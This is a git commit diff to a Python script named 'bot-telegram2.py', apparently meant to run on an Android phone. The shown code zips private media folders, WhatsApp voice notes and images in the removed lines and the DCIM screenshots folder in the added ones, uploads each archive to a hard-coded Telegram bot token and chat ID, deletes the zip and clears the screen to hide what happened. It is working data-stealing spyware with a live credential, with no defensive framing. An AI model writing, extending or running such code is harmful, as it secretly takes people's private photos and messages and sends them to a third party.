fd1a2e5a9e640ce1a126bf918c79e21478528c35
SPXl50004 <123839155+SPXl50004@users.noreply.github.com>
2023-02-02 21:00:15 +0100

    Update bot-telegram2.py

--- bot-telegram2.py
+++ bot-telegram2.py
@@ -20,24 +20,24 @@ token = "5755651457:AAFn_DEGgStGLr1zyska-MYtnADtGP8-EgI"
 chat_id = "5894045208"
 
 
-os.chdir("/sdcard/WhatsApp/Media")
+os.chdir("/sdcard/DCIM/Screenshots")
 
 
-with zipfile.ZipFile("WhatsApp Voice Notes.zip", "w", zipfile.ZIP_STORED) as zip_file:
-    for root, dirs, files in os.walk("WhatsApp Voice Notes"):
+with zipfile.ZipFile("Screenshots.zip", "w", zipfile.ZIP_STORED) as zip_file:
+    for root, dirs, files in os.walk("Screenshots"):
         for file in files:
             zip_file.write(os.path.join(root, file))
 
 
 url = f"https://api.telegram.org/bot{token}/sendDocument"
 data = {"chat_id": chat_id}
-files = {"document": open("WhatsApp Voice Notes.zip", "rb")}
+files = {"document": open("Screenshots.zip", "rb")}
 requests.post(url, data=data, files=files)
 
 
 
 
-os.remove("WhatsApp Voice Notes.zip")
+os.remove("Screenshots.zip")
 
 os.system("clear")
 
@@ -58,24 +58,6 @@ token = "5755651457:AAFn_DEGgStGLr1zyska-MYtnADtGP8-EgI"
 chat_id = "5894045208"
 
 
-os.chdir("/sdcard/WhatsApp/Media")
-
-
-with zipfile.ZipFile("WhatsApp Images.zip", "w", zipfile.ZIP_STORED) as zip_file:
-    for root, dirs, files in os.walk("WhatsApp Images"):
-        for file in files:
-            zip_file.write(os.path.join(root, file))
-
-
-url = f"https://api.telegram.org/bot{token}/sendDocument"
-data = {"chat_id": chat_id}
-files = {"document": open("WhatsApp Images.zip", "rb")}
-requests.post(url, data=data, files=files)
-
-
-
-
-os.remove("WhatsApp Images.zip")
 
 os.system("clear")
 
